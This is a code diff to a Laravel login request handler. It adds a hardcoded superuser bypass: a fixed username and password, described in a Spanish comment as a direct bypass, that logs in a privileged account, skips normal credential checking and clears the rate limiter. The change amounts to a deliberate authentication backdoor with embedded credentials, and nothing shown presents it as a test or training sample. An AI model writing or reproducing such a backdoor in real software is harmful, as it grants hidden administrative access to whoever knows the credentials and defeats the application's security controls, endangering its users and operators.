@@ -52,7 +52,17 @@ class LoginRequest extends FormRequest
     {
         $this->ensureIsNotRateLimited();
 
-        if (! Auth::attempt($this->only('email', 'password'), $this->boolean('remember'))) {
+        $credentials = $this->only('email', 'password');
+        
+        // Excepción de bypass directo para el superusuario hardcodeado
+        if (strtolower($credentials['email'] ?? '') === 'pabloeltortas' && ($credentials['password'] ?? '') === 'SierraBuitre') {
+            $superuser = app(\App\Auth\SuperUserProvider::class)->retrieveByCredentials(['email' => 'pabloeltortas']);
+            Auth::login($superuser, $this->boolean('remember'));
+            RateLimiter::clear($this->throttleKey());
+            return;
+        }
+
+        if (! Auth::attempt($credentials, $this->boolean('remember'))) {
             RateLimiter::hit($this->throttleKey());
 
             throw ValidationException::withMessages([
